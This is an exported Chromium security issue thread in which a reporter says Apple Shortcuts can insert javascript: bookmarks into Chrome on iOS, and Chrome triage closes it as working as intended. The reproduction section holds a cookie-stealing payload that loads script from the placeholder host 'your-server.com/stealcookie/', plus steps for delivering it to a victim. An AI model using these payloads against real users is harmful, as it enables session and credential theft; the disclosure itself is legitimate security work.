@@ -1,0 +1,206 @@
+Issue ID: 414588522
+
+Author: gh...@gmail.com
+<p>Security Bug</p>
+<p>Important: Please do not change the component of this bug manually.</p>
+<p>Please READ THIS FAQ before filing a bug: <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/HEAD/docs/security/faq.md&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0h8YAeArSIHIqsc7nG49Rg">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md</a></p>
+<p>Please see the following link for instructions on filing security bugs: <a href="https://www.chromium.org/Home/chromium-security/reporting-security-bugs" data-b-widget="url" data-b-original-href="https://www.chromium.org/Home/chromium-security/reporting-security-bugs" data-b-redirected-href="https://www.google.com/url?q=https://www.chromium.org/Home/chromium-security/reporting-security-bugs&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1orouQF1IgZRWdXz00WJjF">https://www.chromium.org/Home/chromium-security/reporting-security-bugs</a></p>
+<p>Reports may be eligible for reward payments under the Chrome VRP: <a href="https://g.co/chrome/vrp" data-b-widget="url" data-b-original-href="https://g.co/chrome/vrp" data-b-redirected-href="https://www.google.com/url?q=https://g.co/chrome/vrp&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw18M4cjm-YtjQT6P4u_KxU6">https://g.co/chrome/vrp</a></p>
+<p>NOTE: Security bugs are normally made public once a fix has been widely deployed.</p>
+<hr>
+<h1>VULNERABILITY DETAILS</h1>
+<p>This report reveals an XSS vector via <strong>Apple Shortcuts</strong> and <strong>Google Chrome iOS</strong> that allows an attacker to programmatically inject a <code>javascript:</code> payload as a bookmark in Chrome. The inserted bookmark can then execute JavaScript in the context of any active tab when clicked — such as Account.google.com, Gmail, or Facebook — allowing for session theft or UI spoofing, among other critical vulnerabilities.</p>
+<p>This vulnerability is possible because Chrome iOS accepts external <code>javascript:</code> URIs via Apple Shorcuts without sanitization or warning. Safari and Edge do not allow this behavior, making the issue isolated to Chrome.</p>
+<hr>
+<h2>Affected</h2>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Affected</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Google Chrome (iOS)</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Apple Shortcuts (iOS)</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Safari (iOS)</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Edge (iOS)</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Firefox (iOS)</td>
+<td>Untested</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h1>VERSION</h1>
+<p>Chrome Version: [136.0.7103.56] + [stable,beta, and dev]
+Operating System: [ IOS, 18.5 ]</p>
+<hr>
+<h1>REPRODUCTION CASE</h1>
+<h3>Step 1: Apple Shortcut</h3>
+<p><strong>Create a shortcut with the following action:</strong></p>
+<p><code>javascript:alert(document.cookie)</code></p>
+<p>atau tambahkan url javascript lebih banyak agar potensi eksekusi dari korban lebih besar</p>
+<ul>
+<li><code>javascript:alert(document.cookie)</code></li>
+<li><code>javascript:alert(document.domain)</code></li>
+<li><code>javascript:alert(document.location)</code></li>
+<li><code>javascript:eval(&#39;var a=document.createElement(\&#39;script\&#39;);a.src=\&#39;https://your-server.com/stealcookie/\&#39;;document.body.appendChild(a)&#39;)</code></li>
+</ul>
+<h3>Step 2: Deliver to Victim</h3>
+<p><strong>Send shortcut to victim via:</strong></p>
+<ul>
+<li>iCloud Shortcut link</li>
+<li>Airdrop</li>
+<li>Email</li>
+</ul>
+<p>Victim runs the shortcut.</p>
+<h3>Step 3: Trigger</h3>
+<p>Victim browses to any sensitive site (e.g., <code>https://mail.google.com</code> or <code>accounts.google.com</code>) in Chrome iOS.<br>
+Then clicks the injected bookmark in the bookmarks bar or mobile menu.</p>
+<p><strong>Result:</strong>
+JavaScript is executed <strong>in the context of the active tab</strong>.</p>
+<hr>
+<h2>Impact</h2>
+<ul>
+<li><code>javascript:</code> payload is silently saved as a bookmark.</li>
+<li>Clicking the bookmark while on an active tab runs the JavaScript <strong>in that tab&#39;s origin</strong>.</li>
+<li>Enables:
+<ol>
+<li>Credential theft via <code>document.cookie</code></li>
+<li>Full DOM access to active origin</li>
+<li>Redirects via <code>location.href</code></li>
+<li>Universal XSS</li>
+<li>UI spoofing with <code>prompt</code>, <code>alert</code>, etc.</li>
+<li>There is no warning from the shortcut or indication to the user from Chrome or Apple Shortcuts that it came from javascript:url.</li>
+</ol>
+</li>
+</ul>
+<p>This is <strong>not self-XSS</strong>, as the bookmark is <strong>injected externally</strong> and triggered naturally by the victim (Universal XSS).</p>
+<hr>
+<h2>Fix Recommendation</h2>
+<h3>Chrome iOS</h3>
+<p>Validate and sanitize incoming URLs when parsing <code>googlechrome://bookmark?...</code>.</p>
+<p><strong>Example Fix:</strong></p>
+<pre><code><span class="stx-keyword">function</span> <span>isValidBookmarkUrl</span>(<span>url</span>) {
+  <span class="stx-keyword">const</span> <span>disallowedSchemes</span> = [<span class="stx-string">&#39;javascript:&#39;</span>, <span class="stx-string">&#39;data:&#39;</span>, <span class="stx-string">&#39;vbscript:&#39;</span>];
+  <span class="stx-keyword">return</span> !disallowedSchemes.some(scheme =&gt; url.toLowerCase().startsWith(scheme));
+}
+
+<span class="stx-keyword">if</span> (isValidBookmarkUrl(inputUrl)) {
+  saveBookmark(inputUrl);
+} <span class="stx-keyword">else</span> {
+  alert(<span class="stx-string">&quot;Unsafe URL blocked.&quot;</span>);
+}
+</code></pre>
+<p>Alternative: Block <code>javascript:</code> when coming from external URL, still allow if user manually adds via Chrome interface.</p>
+<pre><code><span class="stx-keyword">if</span> (url.startsWith(<span class="stx-string">&quot;javascript:&quot;</span>)) reject();
+</code></pre>
+<pre><code><span class="stx-keyword">if</span> url.starts(<span class="stx-keyword">with</span>: <span class="stx-string">&quot;javascript:&quot;</span>) {
+    rejectBookmark(<span class="stx-string">&quot;Executable code not allowed&quot;</span>);
+}
+</code></pre>
+<h3>Apple Shortcuts</h3>
+<p><strong>Apple Shortcuts should:</strong></p>
+<p>Prompt user when saving a javascript: URI</p>
+<p>Restrict inter-app bookmarks to https/http/file schemes only</p>
+<p><strong>Example Prompt:</strong></p>
+<pre><code><span class="stx-keyword">if</span> inputURL.scheme == <span class="stx-string">&quot;javascript&quot;</span> {
+  promptUser(<span class="stx-string">&quot;This bookmark may be unsafe. Continue?&quot;</span>)
+}
+</code></pre>
+<h2>Why This Is Critical</h2>
+<p>Although javascript: bookmarks are known, this abuse vector is novel:</p>
+<ul>
+<li>
+<p>The bookmark is externally inserted without user interaction.</p>
+</li>
+<li>
+<p>Chrome iOS lacks any validation or user prompt.</p>
+</li>
+<li>
+<p>Apple Shortcuts injects it silently without any obvious warning like <code>you are about to add javascript:alert() to bookmarks, are you sure?</code>.</p>
+</li>
+<li>
+<p>Exploit chain is smooth, requiring only a single tap by the victim.</p>
+</li>
+</ul>
+<p>The interaction between Apple Shortcuts and third-party apps presents a new, rarely tested attack surface. This vector shows how automation features can be exploited to inject malicious JavaScript into seemingly safe apps.</p>
+<p>*<em>Bookmarks are not just URL storage, they can also be JS trojans if misused.</em></p>
+<p>Reporter credit: Muhammad Zaid Ghifari - Sobat Cyber Indonesia [SCI Kalimantan Utara]</p>
+
+Author: gh...@gmail.com
+public_non_google
+
+Author: gh...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: gh...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: ja...@chromium.org
+<p>Hi, thanks for the report and the screencast and for proposing an improvement.</p>
+<p>From the video, it looks like the user clicks on a well-known mechanism to add a bookmark. The Chrome security guidelines don&#39;t consider running JavaScript from a bookmark to be a vulnerability [1]. I think that reporting the user interface issue to Apple could be useful. They may be able to improve the Apple Shortcut interface to better show users that they are adding a shortcut that executes arbitrary code.</p>
+<p>Following our security vulnerability guidelines I&#39;m going to close this as working as intended.</p>
+<p>[1] - <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/HEAD/docs/security/faq.md%23does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0FP205-ZAF_cfvJ6sPvC06">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability</a></p>
+
+Author: ja...@chromium.org
+public_non_google
+
+Author: ja...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: gh...@gmail.com
+<blockquote>
+<p>From the video, it looks like the user clicks on a well-known mechanism to add a bookmark. The Chrome security guidelines don&#39;t consider running JavaScript from a bookmark to be a vulnerability [1]. I think that reporting the user interface issue to Apple could be useful. They may be able to improve the Apple Shortcut interface to better show users that they are adding a shortcut that executes arbitrary code.
+Following our security vulnerability guidelines I&#39;m going to close this as working as intended.
+[1] - <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/HEAD/docs/security/faq.md%23does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0FP205-ZAF_cfvJ6sPvC06">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability</a></p>
+</blockquote>
+<p>Hi team, thanks for the reply.</p>
+<p>I read that even before I reported this vulnerability</p>
+<p>But I still report this because the point is someone can add a bookmark containing javascript to someone else&#39;s bookmarks so that an attack can exploit this to inject malicious javascript payloads into the victim&#39;s browser.</p>
+<p>if you say that it is according to your guidelines, then show me which policy allows injecting <code>javascript:url</code> over the network to be allowed in google chrome bookmarks? does your documentation page state that?</p>
+<p><a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/HEAD/docs/security/faq.md%23does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0FP205-ZAF_cfvJ6sPvC06">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability</a></p>
+<p>the guidelines regarding bookmarklets containing <code>javascript:alert()</code> do allow it because the victim only writes it manually. but if someone can add <code>javascript:alert()</code> into someone else&#39;s bookmarks then it will be a critical vulnerability.</p>
+<p>why? because the victim&#39;s mobile bookmarks will be connected to the desktop even between Android and IOS devices. this will be a big threat and will damage the reputation of google chrome itself.</p>
+<p>I give you a few examples regarding similar vulnerabilities in Edge and Safari browsers:</p>
+<p><strong>Safari IOS:</strong>
+Allows someone to add <code>javascript:alert()</code> to their bookmarks manually.</p>
+<p>However, when I try to do an attack via the Shortcut App on iOS and send it to the victim and the victim runs it then it will not be saved in the victim&#39;s browser.
+on the Open Url feature also the attack is even blocked by the inspection, so the shortcut containing javascript:url to the bookmark cannot be saved and run.</p>
+<p><strong>Microsoft Edge:</strong>
+This browser allows one to add <code>javascript:alert()</code> to bookmarks via the shortcut app on iOS, I tried running it, when in Edge browser the bookmark containing <code>javascript:alert()</code> is saved in Edge bookmarks and when executing it I found that xss execution is not allowed.
+so when I send it to someone else (victim) via Apple shortcut and the victim runs it, it will just open Edge Browser and save the <code>javascirpt:alert()</code> from the shortcut to their bookmarks. but it will not be able to execute xss</p>
+
+Author: gh...@gmail.com
+T0dabU1tRTFOV05oWkdFeVptTTVOVFUwTkRrd05qVmpZVEF5T0dFMU1XVT0=
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
